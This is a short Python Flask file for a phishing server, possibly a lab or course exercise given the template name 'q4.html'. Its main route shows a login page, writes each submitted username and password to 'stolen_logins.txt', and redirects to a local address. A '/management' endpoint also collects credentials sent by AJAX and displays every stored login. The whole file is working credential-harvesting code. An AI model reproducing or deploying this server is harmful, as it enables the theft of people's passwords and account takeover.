from flask import Flask, request, redirect, render_template, jsonify

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def phishing_page():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        with open("stolen_logins.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
            
        return redirect("http://127.0.0.1:8080/", code=302) 
    return render_template('q4.html')


@app.route('/management', methods=['GET', 'POST'])
def management():
    if request.method == "POST":
        data = request.json  
        username = data.get("username", "")
        password = data.get("password", "")

        if username and password:
            with open("stolen_logins.txt", "a") as file:
                file.write(f"Username: {username}, Password: {password}\n")
        
        return jsonify({"status": "success"}), 200  # AJAX request response

    # Handle GET request: Display stored logins
    with open('stolen_logins.txt', 'r') as f:
        content = f.read().splitlines()
    return render_template("management.html", content=content)

if __name__ == "__main__":
    app.run()
